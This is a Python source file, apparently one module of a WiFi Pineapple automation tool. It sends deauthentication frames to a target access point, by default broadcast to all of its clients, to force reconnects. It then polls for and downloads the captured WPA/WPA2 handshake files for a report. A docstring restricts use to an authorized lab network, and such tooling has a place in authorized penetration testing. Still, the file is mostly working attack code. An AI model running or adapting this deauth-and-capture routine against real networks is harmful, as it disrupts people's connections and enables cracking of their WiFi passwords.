"""
Handshake capture module.

Workflow:
  1. Optionally send deauth frames to force a reconnect (lab AP only)
  2. Poll the Pineapple for newly captured .cap files
  3. Download .cap files to local captures/ directory
  4. Return metadata about each capture for the report

IMPORTANT: Only use against your own lab AP with explicit written authorization.
"""

import time
import os
from modules.base_module import BaseModule
from core.api_client import PineappleClient


class HandshakeModule(BaseModule):
    """
    Manages WPA/WPA2 handshake capture via the Pineapple.

    Args:
        client:       PineappleClient instance.
        target_bssid: MAC of the target AP.
        client_mac:   Specific client to deauth, or broadcast FF:FF:FF:FF:FF:FF.
        capture_dir:  Local directory to save downloaded .cap files.
        poll_wait:    Seconds to wait before polling for new captures.
        log_dir:      Directory for log output.
    """

    def __init__(
        self,
        client: PineappleClient,
        target_bssid: str,
        client_mac: str = "FF:FF:FF:FF:FF:FF",
        capture_dir: str = "./captures",
        poll_wait: int = 20,
        log_dir: str = "./logs",
    ):
        super().__init__(client, log_dir)
        self.target_bssid = target_bssid
        self.client_mac   = client_mac
        self.capture_dir  = capture_dir
        self.poll_wait    = poll_wait
        os.makedirs(capture_dir, exist_ok=True)

    def run(self):
        self.logger.info(f"HandshakeModule targeting BSSID={self.target_bssid}")

        # Step 1: Record handshakes already on device before deauth
        try:
            before = {h["filename"] for h in self.client.get_handshakes()}
        except Exception as e:
            self.logger.error(f"Could not list existing handshakes: {e}")
            before = set()

        # Step 2: Send deauth to trigger reconnect → handshake
        try:
            self.client.send_deauth(self.target_bssid, self.client_mac)
            self.logger.info("Deauth frames sent. Waiting for client to reconnect...")
        except Exception as e:
            self.logger.warning(f"Deauth failed (continuing anyway): {e}")

        # Step 3: Poll for new captures
        self.logger.info(f"Waiting {self.poll_wait}s for handshake capture...")
        time.sleep(self.poll_wait)

        try:
            after = self.client.get_handshakes()
        except Exception as e:
            self.logger.error(f"Could not list handshakes after deauth: {e}")
            self.results = {"captures": [], "error": str(e)}
            return

        # Step 4: Download only newly captured files
        new_captures = [h for h in after if h.get("filename") not in before]
        downloaded = []

        for handshake in new_captures:
            fname = handshake.get("filename", "unknown.cap")
            local_path = os.path.join(self.capture_dir, fname)
            try:
                self.client.download_handshake(fname, local_path)
                downloaded.append({
                    "filename": fname,
                    "local_path": local_path,
                    "bssid": handshake.get("bssid", self.target_bssid),
                    "ssid": handshake.get("ssid", "unknown"),
                    "timestamp": handshake.get("timestamp", "unknown"),
                })
                self.logger.info(f"Downloaded: {fname}")
            except Exception as e:
                self.logger.error(f"Failed to download {fname}: {e}")

        self.results = {"captures": downloaded}
        self.logger.info(f"HandshakeModule complete — {len(downloaded)} capture(s) downloaded.")

    def get_results(self) -> dict:
        return self.results

    def summary(self) -> str:
        n = len(self.results.get("captures", []))
        return f"HandshakeModule: {n} handshake capture(s) downloaded"